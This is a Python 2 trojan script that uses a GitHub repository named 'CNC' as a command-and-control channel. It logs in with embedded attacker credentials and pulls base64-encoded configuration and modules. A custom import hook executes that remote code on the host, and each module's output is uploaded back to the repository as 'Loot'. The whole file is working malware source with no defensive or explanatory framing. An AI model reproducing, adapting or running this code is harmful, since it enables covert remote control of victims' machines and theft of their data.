#!/usr/bin/env python

import json
from base64 import b64encode as enc
from base64 import b64decode as dec
import threading
import imp
import time
import random
import Queue
import os
import sys

from github3 import login


trojan_id = "abc"

trojan_config = "%s.json"%trojan_id
data_path = "data/%s/" % trojan_id
trojan_modules = []
task_queue = Queue.Queue()


def connectToGithub():
	gh = login(username="attacker@gmail.com",password=dec("base64encodedpassword"))

	repo = gh.repository("hackzsd","CNC")
	branch = repo.branch("master")
	return gh,repo,branch

	
def getFileContents(filepath):
	gh,repo,branch = connectToGithub()
	tree = branch.commit.commit.tree.recurse()

	for filename in tree.tree:
		if filepath in filename.path:
			print "[+] Found file file %s "%filepath
			blob = repo.blob(filename.sha) 			# some changes are done here
			return blob.content
	return None	 

def getTrojanConfig():
	global configured
	configured = False
	config_json = getFileContents(trojan_config)
	config = json.loads(dec(config_json))
	configured = True 

	for task in config:
		if task['module'] not in sys.modules:
			exec "import %s"%task['module']

	return config

def saveModuleResults(data):
	gh,repo,branch = connectToGithub()
	remotePath = "data/%s/%d.data"%(trojan_id,random.randint(1000,10000000))
	repo.create_file(remotePath,"Loot added",enc(data))
	return


class GitImporter(object):
	def __init__(self):
		self.current_module_code = ""

	def find_module(self,fullname,path=None):
		if configured:
			print "[+] Attempting to retrieve %s"%fullname
			new_library = getFileContents("Modules/%s"%fullname)
			if new_library is not None:
				self.current_module_code = dec(new_library)
				return self
		return None

	def load_module(self,name):
		module = imp.new_module(name)
		exec self.current_module_code in module.__dict__
		sys.modules[name] = module
		return module


def moduleRunner(module):
	task_queue.put(1)
	result = sys.modules[module].run()
	task_queue.get()
	print result
	saveModuleResults(result)

sys.meta_path = [GitImporter()]

while True:
	if task_queue.empty():

		config = getTrojanConfig()

		for task in config:
			t = threading.Thread(target=moduleRunner,args=(task['module'],))
			t.start()
		break;	
